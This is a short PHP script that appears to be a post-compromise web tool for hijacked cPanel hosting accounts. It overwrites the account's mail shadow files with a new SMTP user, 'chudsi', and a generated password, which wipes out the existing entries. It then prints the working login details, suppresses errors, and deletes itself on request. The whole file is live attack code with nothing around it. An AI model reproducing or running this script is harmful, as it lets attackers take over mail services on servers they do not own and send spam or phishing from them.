<?php
	error_reporting(0);
	$_currUser = get_current_user();
	$_homePath = ["/home/", "/home1/", "/home2/", "/home3/", "/home4/", "/home5/", "/home6/", "/home7/", "/home8/", "/home9/", "/home10/"];
	$_this = 0;
	foreach($_homePath as $_home) {
		if(file_exists($_home . $_currUser)) {
			$_this++;
			if($_this > 0) {
				$_workHome = $_home;
				break;
			}
		}
	}
	$_cp = "$_workHome$_currUser/.cpanel";
	if (is_dir($_cp)) {
		$_currDomain = $_SERVER['HTTP_HOST'];
		if(strstr($_currDomain, 'www.')){
			$_currDomain = str_replace("www.","",$_currDomain);
		}else{
			$_currDomain = $_currDomain;
		}
		$_thispwd = "kenzi.smtp" . mt_rand(100,999);
		$_pwd     = crypt($_thispwd, "$6$the3x$");
		mkdir("$_workHome$_currUser/etc/$_currDomain");
		$_smtp = 'chudsi:'.$_pwd.':16249:::::'."\n";
		$_shadow1 = "/home/$_currUser/etc/$_currDomain/shadow";
		$_shadow2 = "/home/$_currUser/etc/shadow";
		$_fo=fopen($_shadow1,"w");
		fwrite($_fo,$_smtp);
		$_fo2=fopen($_shadow2,"w");
		fwrite($_fo2,$_smtp);
		echo "$_currDomain|587|chudsi@$_currDomain|".$_thispwd;
	} else {
		echo "you think this is a fucking smtp addable website?";
	}
	if(isset($_GET["d"])) {
		unlink(__FILE__);
	}
?>
